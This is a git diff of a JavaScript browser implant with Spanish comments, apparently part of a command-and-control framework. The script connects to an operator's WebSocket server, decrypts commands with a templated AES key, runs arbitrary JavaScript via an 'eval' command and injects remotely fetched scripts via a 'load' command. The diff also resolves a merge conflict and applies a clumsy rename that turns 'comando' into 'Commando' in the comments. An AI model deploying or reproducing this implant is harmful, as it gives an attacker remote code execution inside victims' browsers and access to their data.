@@ -6,7 +6,7 @@ function sendMessage(msg) {
 function loadScriptFromURL(url) {
     // Si la URL no viene completa, se completa la URL para descargar el script del servidor
     if (!(/(http(s?)):\/\//i.test(url))) {
-        url = "http://$host:$hport/" + url
+        url = "http://$hhost:$hport/" + url
     }
     // Comprueba si el script existe, si existe devuelve true y carga una etiqueta script en el head del documento.
     return fetch(url).then(response => {
@@ -18,10 +18,6 @@ function loadScriptFromURL(url) {
         return response.ok
     })
 }
-
-<<<<<<< HEAD
-const webSocket = new WebSocket("ws://$host:$wport");
-=======
 function loadScript(script) {
     var node = document.createElement("script");
     node.innerHTML = script;
@@ -29,22 +25,22 @@ function loadScript(script) {
     node.remove()
 }
 
-const webSocket = new WebSocket("ws://" + host + ":" + wsport);
->>>>>>> e555594688ce80c742f1401e128f65a376deac94
+const webSocket = new WebSocket("ws://$whost:$wport/$sid");
+
 webSocket.onopen = (event) => {
     sendMessage({ type: 1 });
 };
 
-/* Esta es un diccionario de tipo {"string":function}, la string es el comando que recibirá el onmessage, la función será el comando.
+/* Esta es un diccionario de tipo {"string":function}, la string es el Commando que recibirá el onmessage, la función será el Commando.
 
-Para cargar más funcionalidades que interactúen con módulos en el backend se debe cargar en un script que incluya el comando al
+Para cargar más funcionalidades que interactúen con módulos en el backend se debe cargar en un script que incluya el Commando al
 diccionario. Importante mandar un mensaje en algún momento de la ejecución.
-Comandos por defecto:
+Commandos por defecto:
     OK - keep alive la conexión
-    eval - ejecuta lo que venga en el comando y devuelve lo que retorno
+    eval - ejecuta lo que venga en el Commando y devuelve lo que retorno
     load - carga un fichero desde un URL.
  */
-var _webs_comands_ = {
+var _webs_Commands_ = {
     "OK": function (mes) { sendMessage({ type: 1 }) },
     "eval": function (mes) {
         sendMessage({ type: 0, msg: { outputType: "console", text: eval(mes["expression"]) } })
@@ -64,7 +60,7 @@ webSocket.onmessage = (event) => {
     try {
         const output = hex2a(decrypt(event.data));
         let mes = JSON.parse(output)
-        _webs_comands_[mes["comand"]](mes)
+        _webs_Commands_[mes["Command"]](mes)
     } catch (e) { sendMessage({ type: 0, msg: { outputType: "error", text: e.toString() } }) }
 
 };
@@ -76,7 +72,7 @@ var secretKey = "$key";
 var derived_key = CryptoJS.enc.Base64.parse(secretKey);
 
 // Initialize the initialization vector (IV) and encryption mode
-var iv = CryptoJS.enc.Utf8.parse("$IV");
+var iv = CryptoJS.enc.Hex.parse("$IV");
 var encryptionOptions = {
     iv: iv,
     mode: CryptoJS.mode.CBC
